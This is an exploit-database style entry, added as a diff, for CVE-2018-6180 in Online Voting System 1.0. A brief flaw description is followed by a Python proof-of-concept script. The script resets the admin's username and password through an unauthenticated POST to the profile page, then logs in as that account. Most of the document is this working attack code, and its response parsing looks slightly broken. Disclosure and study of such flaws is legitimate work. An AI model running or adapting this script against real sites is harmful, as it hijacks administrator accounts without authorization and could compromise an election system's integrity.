@@ -1,0 +1,70 @@
+# Exploit Title: Online Voting System - Authentication Bypass
+# Date: 02.02.2018
+# Vendor Homepage: http://themashabrand.com
+# Software Link: http://themashabrand.com/p/votin
+# Demo: http://localhost/Onlinevoting
+# Version: 1.0
+# Category: Webapps
+# Exploit Author: Giulio Comi
+# CVE : CVE-2018-6180
+
+
+#Description
+
+A flaw in the profile section of Online Voting System allows an unauthenticated user to set an arbitrary password for accounts registered in the application.
+
+The application does not check the validity of the session cookie and updates the password and other fields of a user based on an incremental identifier and without requiring the current valid password for target account.
+
+# Proof of Concept:
+
+#!/usr/bin/env python
+import requests
+from time import sleep
+from lxml import html
+
+
+def own(auth_bypass_request):
+    """
+    Reset the password of a user just knowing his id
+    """
+    url_edit_password = "admin/profile.php"
+
+    payload = {
+               'id': 1,
+               'admin': 'admin',  # overwrite the username of the victim
+               'password': "ARBITRARY_PASSWORD", # overwrite the password of the victim
+               'edit': ''
+              }
+
+    response = auth_bypass_request.post(target_site + url_edit_password, data=payload)
+
+    # Parse response to check if the request was successful
+    check_result = html.fromstring(response).xpath('//div[@class="alert alert-success"]//p//strong/text()')
+
+    return(lambda: False, lambda: True)[str(check_result).find('Successfully') > -1]()
+
+
+def login(login_request):
+    """
+    Enjoy the new password chosen for the victim
+    """
+    credentials = {'username': 'admin',
+                   'password': "ARBITRARY_PASSWORD",
+                   'usertype': 'admin',
+                   'login': ''
+                  }
+
+    response = login_request.post(target_site, data=credentials)
+
+    print(response.text)
+
+
+if __name__ == "__main__":
+
+    target_site = "http://localhost/Onlinevoting/"
+    request = requests.Session()
+    if own(request):
+        sleep(4)  # just a bit of delay
+        login(request)
+    else:
+        print('Maybe the given id is not registered in the application')
